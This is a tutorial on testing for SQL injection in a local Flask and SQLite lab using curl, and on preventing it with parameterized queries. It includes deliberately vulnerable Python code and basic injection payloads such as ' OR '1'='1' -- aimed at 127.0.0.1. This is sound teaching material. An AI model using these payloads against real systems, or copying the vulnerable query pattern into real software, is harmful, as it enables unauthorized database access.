# SQL Injection Testing with Python, SQL and CURL

**Author:** Nzegge Charles Ngong

## 1. Introduction

SQL Injection (SQLi) is a vulnerability that occurs when an application incorporates untrusted user input into an SQL statement without properly separating data from SQL instructions.

An attacker may manipulate the intended SQL query, potentially accessing records that should not be accessible or changing database operations.

This document covers:

- SQL injection fundamentals.
- Common SQL injection payloads.
- Corresponding SQL commands.
- CURL requests for testing.
- Understanding SQL comments and Boolean conditions.
- SQL injection detection.
- Parameterized queries and prevention.

**Testing environment:** Use only your own application, local lab, or an application for which you have explicit authorization.

## 2. Understanding the vulnerable SQL query

Consider this Python code:

```python
category = request.args.get("category")

query = f"""
    SELECT id, name, category, price
    FROM products
    WHERE category = '{category}'
"""

cursor.execute(query)
```

A normal request:

```text
http://127.0.0.1:8000/vulnerable/products?category=Electronics
```

Produces:

```sql
SELECT id, name, category, price
FROM products
WHERE category = 'Electronics';
```

The problem is that the application directly inserts user input into the SQL query.

A malicious input may change the meaning of the SQL statement.

## 3. CURL fundamentals

CURL is a command-line tool for making HTTP requests.

In Windows PowerShell, use `curl.exe` to ensure you are running the actual CURL executable rather than the PowerShell alias.

### Important CURL options

| Option | Description |
|---|---|
| `-G` | Use GET and place supplied data in the URL |
| `-d` | Supply request data |
| `--data-urlencode` | URL-encode request parameters |
| `-X` | Specify the HTTP method |
| `-H` | Add an HTTP header |
| `-i` | Display response headers and body |
| `-I` | Request headers only |
| `-v` | Display detailed request information |
| `-s` | Silent mode |
| `-S` | Display errors when using silent mode |
| `-L` | Follow redirects |
| `-b` | Send cookies |
| `-c` | Save cookies |
| `--max-time` | Set a maximum request duration |

Example:

```powershell
curl.exe -G "http://127.0.0.1:8000/vulnerable/products" `
    --data-urlencode "category=Electronics"
```

The backtick (`) continues a PowerShell command onto another line.

## 4. SQL injection payloads

### 4.1 Single quote (`'`)

**Purpose:** Test how the application handles SQL string delimiters.

Payload:

```text
'
```

CURL:

```powershell
curl.exe -G "http://127.0.0.1:8000/vulnerable/products" `
    --data-urlencode "category='"
```

Possible SQL:

```sql
SELECT *
FROM products
WHERE category = ''';
```

The resulting statement contains an unmatched quote and may generate a syntax error.

**What you learn:** Whether a quote in user input interferes with SQL string syntax.

### 4.2 Double single quotes (`''`)

**Purpose:** Test SQL quote escaping.

Payload:

```text
''
```

CURL:

```powershell
curl.exe -G "http://127.0.0.1:8000/vulnerable/products" `
    --data-urlencode "category=''"
```

SQL example:

```sql
SELECT 'Charles''s laptop';
```

Result:

```text
Charles's laptop
```

In SQL, two consecutive single quotes inside a string represent one literal single quote.

**What you learn:** How SQL handles escaped quotes.

### 4.3 Numeric field test (`1'`)

**Purpose:** Investigate whether an input is being interpreted as a number or string.

Payload:

```text
1'
```

CURL:

```powershell
curl.exe -G "http://127.0.0.1:8000/vulnerable/products" `
    --data-urlencode "category=1'"
```

Example numeric query:

```sql
SELECT *
FROM products
WHERE id = 1;
```

A vulnerable application might construct a query using an unquoted numeric input. Adding an unexpected quote may expose a SQL syntax problem.

**Important:** The actual result depends on how the application constructs the query. A field being numeric does not automatically mean its SQL value is unquoted.

### 4.4 Boolean true (`1 AND 1=1`)

**Purpose:** Test a condition that evaluates to true.

Payload:

```text
1 AND 1=1
```

SQL:

```sql
SELECT *
FROM products
WHERE id = 1 AND 1=1;
```

Explanation:

```sql
1=1
```

This condition is true.

Therefore:

```sql
1 AND TRUE
```

is true.

The query should return the same record as the original condition.

CURL for a numeric-ID endpoint:

```powershell
curl.exe -G "http://127.0.0.1:8000/vulnerable/product" `
    --data-urlencode "id=1 AND 1=1"
```

### 4.5 Boolean false (`1 AND 1=2`)

**Purpose:** Test a condition that evaluates to false.

Payload:

```text
1 AND 1=2
```

SQL:

```sql
SELECT *
FROM products
WHERE id = 1 AND 1=2;
```

Explanation:

```sql
1=2
```

This condition is false.

Therefore:

```sql
1 AND FALSE
```

is false.

The query should return no records.

CURL:

```powershell
curl.exe -G "http://127.0.0.1:8000/vulnerable/product" `
    --data-urlencode "id=1 AND 1=2"
```

**Comparison:**

| Condition | Expected result |
|---|---|
| `1 AND 1=1` | Matching record |
| `1 AND 1=2` | No matching record |

A consistent difference between true and false conditions may indicate Boolean-based SQL injection.

### 4.6 OR true (`1 OR 1=1`)

**Purpose:** Understand how OR can make a condition universally true.

Payload:

```text
1 OR 1=1
```

SQL:

```sql
SELECT *
FROM products
WHERE id = 1 OR 1=1;
```

Explanation:

The OR operator returns true when at least one condition is true.

Since `1=1` is always true, the condition matches every row.

CURL for a numeric-ID endpoint:

```powershell
curl.exe -G "http://127.0.0.1:8000/vulnerable/product" `
    --data-urlencode "id=1 OR 1=1"
```

### 4.7 SQL line comment (`--`)

**Purpose:** Understand how SQL comments work.

Example:

```sql
SELECT *
FROM products
WHERE category = 'Electronics'; -- This is a comment
```

Everything after the comment marker on that line is ignored.

SQLite supports:

```sql
-- comment
```

MySQL also supports `--`, but requires whitespace or a control character after the second hyphen.

CURL syntax test:

```powershell
curl.exe -G "http://127.0.0.1:8000/vulnerable/products" `
    --data-urlencode "category=Electronics -- test"
```

The text only becomes an SQL comment if the database parses it in an SQL syntax position. Sending the characters in a parameter does not automatically make them executable SQL.

### 4.8 MySQL hash comment (`#`)

**Purpose:** Understand MySQL-specific comment syntax.

Payload:

```text
#
```

MySQL supports:

```sql
SELECT *
FROM products
WHERE category = 'Electronics' # comment
;
```

Database compatibility:

| Database | `--` | `#` |
|---|---|---|
| SQLite | Yes | No |
| MySQL | Yes, with required whitespace after `--` | Yes |
| PostgreSQL | Yes | No |
| SQL Server | Yes | No |

CURL syntax test:

```powershell
curl.exe -G "http://127.0.0.1:8000/vulnerable/products" `
    --data-urlencode "category=Electronics # test"
```

### 4.9 Stacked query concept (`;`)

**Purpose:** Understand SQL statement separation.

The semicolon terminates an SQL statement.

Example:

```sql
SELECT name FROM products;

SELECT category FROM products;
```

Some database APIs permit multiple SQL statements in one execution operation. Others reject them.

Python SQLite:

```python
cursor.execute("SELECT * FROM products")
```

The `execute()` method generally accepts one SQL statement.

SQLite also provides:

```python
connection.executescript("""
    SELECT 'first statement';
    SELECT 'second statement';
""")
```

`executescript()` can execute multiple statements, but must never be used with untrusted user input.

**Safety:** Do not test destructive commands such as `DROP TABLE` against important data. Study statement separation using harmless statements in a disposable database.

## 5. Payload reference table

| Payload | SQL concept | Purpose |
|---|---|---|
| `'` | String delimiter | Test quote handling |
| `''` | Escaped quote | Test quote escaping |
| `1'` | Numeric/string context | Test input interpretation |
| `1 AND 1=1` | Boolean AND | True condition |
| `1 AND 1=2` | Boolean AND | False condition |
| `1 OR 1=1` | Boolean OR | Universally true condition |
| `--` | SQL comment | Understand line comments |
| `#` | MySQL comment | Understand MySQL-specific comments |
| `;` | Statement separator | Understand stacked queries |

## 6. Testing the actual Flask + SQLite lab

The lab uses:

```text
http://127.0.0.1:8000
```

Available routes:

```text
/vulnerable/products
/safe/products
```

The parameter is:

```text
category
```

### Normal request

```powershell
curl.exe -G "http://127.0.0.1:8000/vulnerable/products" `
    --data-urlencode "category=Electronics"
```

Expected: two products.

### Boolean true test

```powershell
curl.exe -G "http://127.0.0.1:8000/vulnerable/products" `
    --data-urlencode "category=' OR '1'='1' -- "
```

Resulting SQL:

```sql
SELECT id, name, category, price
FROM products
WHERE category = '' OR '1'='1' -- ';
```

The condition is true, so all seven products may be returned.

### Boolean false test

```powershell
curl.exe -G "http://127.0.0.1:8000/vulnerable/products" `
    --data-urlencode "category=' AND '1'='2' -- "
```

Resulting SQL:

```sql
SELECT id, name, category, price
FROM products
WHERE category = '' AND '1'='2' -- ';
```

The condition is false, so no products should be returned.

### Test the safe endpoint

```powershell
curl.exe -G "http://127.0.0.1:8000/safe/products" `
    --data-urlencode "category=' OR '1'='1' -- "
```

Expected:

```json
[]
```

The payload is treated as a literal category value, not executable SQL.

## 7. How to interpret HTTP responses

| HTTP response | Meaning |
|---|---|
| 200 OK | Request succeeded |
| 400 Bad Request | Request rejected or invalid |
| 401 Unauthorized | Authentication required or failed |
| 403 Forbidden | Access denied |
| 404 Not Found | Resource not found |
| 500 Internal Server Error | Server-side error |

A 500 error alone does not prove SQL injection.

Compare normal input, true conditions, false conditions, and the application's behavior. Inspect server-side SQL logs in your own lab.

## 8. SQL injection prevention

### Unsafe implementation

```python
query = f"""
    SELECT *
    FROM products
    WHERE category = '{category}'
"""

cursor.execute(query)
```

### Safe implementation

```python
query = """
    SELECT *
    FROM products
    WHERE category = ?
"""

cursor.execute(query, (category,))
```

The placeholder separates SQL instructions from user data.

### Parameter placeholder reference

| Database / driver | Placeholder |
|---|---|
| SQLite | `?` |
| Psycopg | `%s` |
| MySQL Connector/Python | `%s` |
| PostgreSQL native prepared statements | `$1` |
| Drivers supporting named parameters | `:category` |

### Additional security practices

1. Always use parameterized SQL queries.
2. Validate input types and lengths.
3. Use allowlists for dynamic table and column names.
4. Avoid executing multiple SQL statements from untrusted input.
5. Use database accounts with minimum required permissions.
6. Do not expose detailed database errors to users.
7. Log errors securely for debugging.
8. Use appropriate authentication and authorization.
9. Back up important databases.
10. Test security changes in a development environment.

## 9. Practice exercises

Use your local Flask application.

1. Send a normal category request and inspect the returned JSON.
2. Explain why a single quote can produce a SQL syntax error.
3. Explain the difference between `AND` and `OR`.
4. Explain why `1=1` is true.
5. Explain why `1=2` is false.
6. Compare the vulnerable endpoint with the safe endpoint.
7. Explain why SQLite accepts `--` but not `#` as a line-comment marker.
8. Explain the difference between `execute()` and `executescript()`.
9. Explain why parameterized queries prevent SQL syntax from being introduced through a parameter value.
10. Identify which tests are specific to MySQL and which are supported by SQLite.

## 10. Recommended learning sequence

Study these topics in order:

1. SQL syntax: `SELECT`, `WHERE`, `AND`, `OR`, `ORDER BY`.
2. SQL string literals and quotation marks.
3. SQL operators and Boolean logic.
4. SQL comments.
5. HTTP GET and POST requests.
6. CURL and URL encoding.
7. String-based SQL injection.
8. Numeric-based SQL injection.
9. Boolean-based SQL injection.
10. Error-based SQL injection.
11. UNION-based SQL injection.
12. Time-based SQL injection.
13. Parameterized queries and SQL injection prevention.

**Final lesson:** Do not memorize payloads without understanding the SQL statement they interact with. First understand how the application constructs its query, then understand how SQL evaluates that query, and finally learn how to prevent user input from changing its structure.
